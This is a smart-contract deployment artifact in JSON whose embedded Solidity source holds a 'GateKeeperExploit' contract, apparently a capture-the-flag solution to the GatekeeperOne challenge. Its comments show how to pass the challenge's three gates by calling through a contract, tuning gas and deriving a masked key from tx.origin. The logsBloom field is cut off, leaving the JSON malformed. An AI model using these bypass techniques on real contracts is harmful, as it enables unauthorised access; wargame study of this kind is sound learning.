{
  "address": "0xcdC7c5E42d9F56272A8D32269C3e5A5195c53dD4",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_add",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "inputGas",
          "type": "uint256"
        }
      ],
      "name": "hack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "test",
      "outputs": [
        {
          "internalType": "uint32",
          "name": "key3264",
          "type": "uint32"
        },
        {
          "internalType": "uint64",
          "name": "key64",
          "type": "uint64"
        },
        {
          "internalType": "uint160",
          "name": "key160",
          "type": "uint160"
        },
        {
          "internalType": "uint16",
          "name": "key1664",
          "type": "uint16"
        },
        {
          "internalType": "uint16",
          "name": "key16160",
          "type": "uint16"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "transactionHash": "0xa000f200aff2f62f90dd9b3ba118260a26437937c6318817e26f075363988ef9",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0xcdC7c5E42d9F56272A8D32269C3e5A5195c53dD4",
    "transactionIndex": 71,
    "gasUsed": "273098",
    "logsBloom": "0x
    "blockHash": "0xf5025fc9f2ebbc8cbd3708da5e2c61d8acf937e6be163a2f80a71f71bb685a0b",
    "transactionHash": "0xa000f200aff2f62f90dd9b3ba118260a26437937c6318817e26f075363988ef9",
    "logs": [],
    "blockNumber": 8282529,
    "cumulativeGasUsed": "10955012",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xf882E5f3F89A8184E04f600b28E31C6D1AD11FBB"
  ],
  "numDeployments": 2,
  "solcInputHash": "9d4fe27ade5d42c1bb45ec3be0da8eb8",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_add\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"inputGas\",\"type\":\"uint256\"}],\"name\":\"hack\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"test\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"key3264\",\"type\":\"uint32\"},{\"internalType\":\"uint64\",\"name\":\"key64\",\"type\":\"uint64\"},{\"internalType\":\"uint160\",\"name\":\"key160\",\"type\":\"uint160\"},{\"internalType\":\"uint16\",\"name\":\"key1664\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"key16160\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperOne.sol\":\"GateKeeperExploit\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/GateKeeperOne.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract GatekeeperOne {\\n    address public entrant;\\n\\n    modifier gateOne() {\\n        require(msg.sender != tx.origin);\\n        _;\\n    }\\n\\n    modifier gateTwo() {\\n        require(gasleft() % 8191 == 0);\\n        _;\\n    }\\n\\n    modifier gateThree(bytes8 _gateKey) {\\n        require(\\n            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),\\n            \\\"GatekeeperOne: invalid gateThree part one\\\"\\n        );\\n        require(\\n            uint32(uint64(_gateKey)) != uint64(_gateKey),\\n            \\\"GatekeeperOne: invalid gateThree part two\\\"\\n        );\\n        require(\\n            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),\\n            \\\"GatekeeperOne: invalid gateThree part three\\\"\\n        );\\n        _;\\n    }\\n\\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\\n        entrant = tx.origin;\\n        return true;\\n    }\\n}\\n\\ncontract GateKeeperExploit {\\n    GatekeeperOne private immutable gatekeeper;\\n\\n    constructor(address _add) {\\n        gatekeeper = GatekeeperOne(_add);\\n    }\\n\\n    function hack(uint256 inputGas) external returns (bool) {\\n        // since we are sending via smart contract\\n        // first condition require(msg.sender != tx.origin) will be satisfied\\n\\n        // for second condition gasleft() % 8191 == 0) to be satisfies, its a matter of trial and error\\n        // keep changing gas until gate 2 gets satisied\\n        // I found the gas value is 6000\\n\\n        // key generation\\n        // first condition is uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))\\n        // to satisy this 0x11111111 = 0x1111 -> this is only possible if we used a mask of 0x0000ffff\\n        // when we do bytesA & mask -> we get a bytesB which satisfies this condition\\n\\n        // second condition is  uint32(uint64(_gateKey)) != uint64(_gateKey)\\n        // to satisy this 0x1111111100001111 = 0x00001111 -> this is posible if we use mask 0xffffffff0000ffff\\n        // when we do bytesA * mask above -> we get bytesB which satisfies both conditions above\\n\\n        // third condition is uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))\\n        // to satisy this, we just need a bytes8 based on tx origin\\n        // use uint64(uint160(tx.origin)) && 0xffffffff0000ffff and we should get third condition trye\\n        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;\\n        return gatekeeper.enter{gas: inputGas}(key);\\n    }\\n\\n    function test()\\n        external\\n        view\\n        returns (uint32 key3264, uint64 key64, uint160 key160, uint16 key1664, uint16 key16160)\\n    {\\n        bytes8 inputBytes8 = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;\\n        key3264 = uint32(uint64(inputBytes8));\\n        key64 = uint64(inputBytes8);\\n        key160 = uint160(tx.origin);\\n        key1664 = uint16(uint64(inputBytes8));\\n        key16160 = uint16(uint160(tx.origin));\\n    }\\n}\\n\",\"keccak256\":\"0x0b122514c25c365ac0c502e072dc172b44e6658d178b990a0cc4fd6da8956de0\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x60a060405234801561001057600080fd5b506040516104ff3803806104ff833981810160405281019061003291906100cf565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100fc565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009c82610071565b9050919050565b6100ac81610091565b81146100b757600080fd5b50565b6000815190506100c9816100a3565b92915050565b6000602082840312156100e5576100e461006c565b5b60006100f3848285016100ba565b91505092915050565b6080516103e9610116600039600060a501526103e96000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806325565cdd1461003b578063f8a8fd6d1461006b575b600080fd5b610055600480360381019061005091906101c0565b61008d565b6040516100629190610208565b60405180910390f35b610073610149565b6040516100849594939291906102b1565b60405180910390f35b60008067ffffffff0000ffff60c01b3260c01b1690507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633370204e84836040518363ffffffff1660e01b81526004016100fd919061033f565b60206040518083038160008887f115801561011c573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906101419190610386565b915050919050565b60008060008060008067ffffffff0000ffff60c01b3260c01b1690508060c01c95508060c01c94503293508060c01c9250329150509091929394565b600080fd5b6000819050919050565b61019d8161018a565b81146101a857600080fd5b50565b6000813590506101ba81610194565b92915050565b6000602082840312156101d6576101d5610185565b5b60006101e4848285016101ab565b91505092915050565b60008115159050919050565b610202816101ed565b82525050565b600060208201905061021d60008301846101f9565b92915050565b600063ffffffff82169050919050565b61023c81610223565b82525050565b600067ffffffffffffffff82169050919050565b61025f81610242565b82525050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61028e81610265565b82525050565b600061ffff82169050919050565b6102ab81610294565b82525050565b600060a0820190506102c66000830188610233565b6102d36020830187610256565b6102e06040830186610285565b6102ed60608301856102a2565b6102fa60808301846102a2565b9695505050505050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b61033981610304565b82525050565b60006020820190506103546000830184610330565b92915050565b610363816101ed565b811461036e57600080fd5b50565b6000815190506103808161035a565b92915050565b60006020828403121561039c5761039b610185565b5b60006103aa84828501610371565b9150509291505056fea264697066735822122078ec957be3f3d5015ddcf4e8dde8364d7160eba155dd0fe6efd457c860fe921d64736f6c63430008110033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100365760003560e01c806325565cdd1461003b578063f8a8fd6d1461006b575b600080fd5b610055600480360381019061005091906101c0565b61008d565b6040516100629190610208565b60405180910390f35b610073610149565b6040516100849594939291906102b1565b60405180910390f35b60008067ffffffff0000ffff60c01b3260c01b1690507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633370204e84836040518363ffffffff1660e01b81526004016100fd919061033f565b60206040518083038160008887f115801561011c573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906101419190610386565b915050919050565b60008060008060008067ffffffff0000ffff60c01b3260c01b1690508060c01c95508060c01c94503293508060c01c9250329150509091929394565b600080fd5b6000819050919050565b61019d8161018a565b81146101a857600080fd5b50565b6000813590506101ba81610194565b92915050565b6000602082840312156101d6576101d5610185565b5b60006101e4848285016101ab565b91505092915050565b60008115159050919050565b610202816101ed565b82525050565b600060208201905061021d60008301846101f9565b92915050565b600063ffffffff82169050919050565b61023c81610223565b82525050565b600067ffffffffffffffff82169050919050565b61025f81610242565b82525050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61028e81610265565b82525050565b600061ffff82169050919050565b6102ab81610294565b82525050565b600060a0820190506102c66000830188610233565b6102d36020830187610256565b6102e06040830186610285565b6102ed60608301856102a2565b6102fa60808301846102a2565b9695505050505050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b61033981610304565b82525050565b60006020820190506103546000830184610330565b92915050565b610363816101ed565b811461036e57600080fd5b50565b6000815190506103808161035a565b92915050565b60006020828403121561039c5761039b610185565b5b60006103aa84828501610371565b9150509291505056fea264697066735822122078ec957be3f3d5015ddcf4e8dde8364d7160eba155dd0fe6efd457c860fe921d64736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [],
    "types": null
  }
}